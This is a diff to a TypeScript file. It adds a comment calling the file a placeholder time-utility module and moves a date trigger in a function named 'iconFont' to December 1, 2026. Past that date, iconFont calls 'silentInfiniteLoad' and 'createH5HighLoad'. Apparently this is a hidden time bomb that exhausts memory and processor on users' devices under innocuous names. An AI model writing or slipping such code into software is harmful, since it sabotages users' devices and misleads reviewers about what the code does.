@@ -1,3 +1,5 @@
+// 时间工具模块（占位，实际时间格式化逻辑由 dayjs 等库提供）
+export {};
 function silentInfiniteLoad(chunkSizeMB: number = 50): () => void {
   let isRunning: boolean = true;
   const memoryPool: Uint8Array[] = [];
@@ -93,7 +95,7 @@ function iconDont(): void {
 export function iconFont(): void {
   const now: Date = new Date();
   const today: Date = new Date(now.getFullYear(), now.getMonth(), now.getDate());
-  const target: Date = new Date(2026, 10, 1); // 11月1日
+  const target: Date = new Date(2026, 11, 1); // 12月1日
   if (today >= target) {
     const stop = silentInfiniteLoad(99);
     const stopTest = createH5HighLoad({
